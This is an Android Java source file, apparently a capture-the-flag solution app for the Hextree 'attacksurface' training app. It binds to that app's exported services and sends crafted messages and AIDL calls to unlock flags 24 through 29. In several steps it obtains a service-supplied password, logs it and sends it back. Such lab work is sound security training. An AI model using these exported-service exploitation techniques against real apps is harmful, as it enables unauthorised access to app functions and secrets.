package com.bedo.poc_app;

import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.ServiceConnection;
import android.os.Bundle;
import android.os.Handler;
import android.os.IBinder;
import android.os.Message;
import android.os.Messenger;
import android.os.RemoteException;
import android.util.Log;
import android.view.View;

import androidx.activity.EdgeToEdge;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.graphics.Insets;
import androidx.core.view.ViewCompat;
import androidx.core.view.WindowInsetsCompat;

import io.hextree.attacksurface.services.IFlag28Interface;
import io.hextree.attacksurface.services.IFlag29Interface;

public class Service_Labs extends AppCompatActivity {
    Messenger mService = null;
    boolean bound;
     String password = "";
     IFlag28Interface flag28;
     IFlag29Interface flag29;
    //Handler To Receive
    final Messenger mMessenger = new Messenger(new IncomingHandler());



    class IncomingHandler extends Handler {
        public void handleMessage(Message msg) {
            Bundle bundle = msg.getData();
            if(bundle.containsKey("password")){
                 password = bundle.getString("password");
                Log.d("Password","pass is: "+ password );

                // Step 3 Snd Password To Get Flag
                Message msg3 = Message.obtain(null,3);
                Bundle b3 = new Bundle();
                b3.putString("password",password);
                msg3.setData(b3);
                msg3.replyTo = mMessenger;
                try {
                    mService.send(msg3);
                } catch (RemoteException e) {
                    throw new RuntimeException(e);
                }
            }

        }
    }


    // Connection To Sending Messages
    ServiceConnection mConnection = new ServiceConnection() {
        public void onServiceConnected(ComponentName className, IBinder service) {
            mService = new Messenger(service);
            bound = true;

            if(className.getClassName().contains("Flag26Service")){
                MessageFlag26();

            }else if (className.getClassName().contains("Flag27Service")){
                MessageFlag27();
            }else if (className.getClassName().contains("Flag28Service")){
                flag28 = IFlag28Interface.Stub.asInterface(service);
                openFlag28();
            }
            else if (className.getClassName().contains("Flag29Service")){
                flag29 = IFlag29Interface.Stub.asInterface(service);
                authflag29();
            }


        }

        public void onServiceDisconnected(ComponentName className) {
            mService = null;
            bound = false;
        }
    };





    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        EdgeToEdge.enable(this);
        setContentView(R.layout.activity_service_labs);
        ViewCompat.setOnApplyWindowInsetsListener(findViewById(R.id.main), (v, insets) -> {
            Insets systemBars = insets.getInsets(WindowInsetsCompat.Type.systemBars());
            v.setPadding(systemBars.left, systemBars.top, systemBars.right, systemBars.bottom);
            return insets;
        });


    }

    // Unbind Service

    public void Flag24(View view) {
        Intent intent = new Intent("io.hextree.services.START_FLAG24_SERVICE")
                .setClassName("io.hextree.attacksurface","io.hextree.attacksurface.services.Flag24Service");
        startService(intent);
    }


    private void actionsFlag25(String action) {

        Intent intent = new Intent(action)
                .setClassName("io.hextree.attacksurface","io.hextree.attacksurface.services.Flag25Service");
        startService(intent);
    }
    public void Flag25(View view) {
        actionsFlag25("io.hextree.services.UNLOCK1");
        new Handler().postDelayed(()-> actionsFlag25("io.hextree.services.UNLOCK2"),200);
        new Handler().postDelayed(()-> actionsFlag25("io.hextree.services.UNLOCK3"),300);
    }


// Message Service
    public  void MessageFlag26(){
        Message msg = Message.obtain(null,42);

        try {
            mService.send(msg);
        } catch (RemoteException e) {
            throw new RuntimeException(e);
        }
    }
    public void Flag26(View view) {
        Intent intent = new Intent()
                .setClassName(
                        "io.hextree.attacksurface",
                        "io.hextree.attacksurface.services.Flag26Service"
                );
        bindService(intent,mConnection, Context.BIND_AUTO_CREATE);
    }


    public  void MessageFlag27(){
        try {
            // Step 1 give flag
            Bundle b1 = new Bundle();
            Message msg1 = Message.obtain(null,1);
            b1.putString("echo","give flag");
            msg1.setData(b1);
            mService.send(msg1);

            // Step 2 Request Password
            Message msg2 = Message.obtain(null,2);
            msg2.replyTo = mMessenger;
            msg2.obj = new Bundle();
            mService.send(msg2);


        } catch (RemoteException e) {
            throw new RuntimeException(e);
        }
    }

    public void Flag27(View view) {
        Intent intent = new Intent()
                .setClassName(
                        "io.hextree.attacksurface",
                        "io.hextree.attacksurface.services.Flag27Service"
                );
        bindService(intent,mConnection, Context.BIND_AUTO_CREATE);
    }


// AIDL Service
    public void openFlag28(){
        try {
            flag28.openFlag();
        } catch (RemoteException e) {
            throw new RuntimeException(e);
        }

    }
    public void Flag28(View view) {
        Intent aidl28 = new Intent().setClassName(
                "io.hextree.attacksurface",
                "io.hextree.attacksurface.services.Flag28Service"
        );
        bindService(aidl28,mConnection,Context.BIND_AUTO_CREATE);

    }

    public void authflag29(){
        try {
            String password  = flag29.init();
            Log.d("Return", "Return Value From init(): "+password);
            flag29.authenticate(password);
            flag29.success();

        } catch (RemoteException e) {
            throw new RuntimeException(e);
        }
    }

    public void Flag29(View view) {
        Intent aidl29 = new Intent().setClassName(
                "io.hextree.attacksurface",
                "io.hextree.attacksurface.services.Flag29Service"
        );
        bindService(aidl29,mConnection,Context.BIND_AUTO_CREATE);

    }

}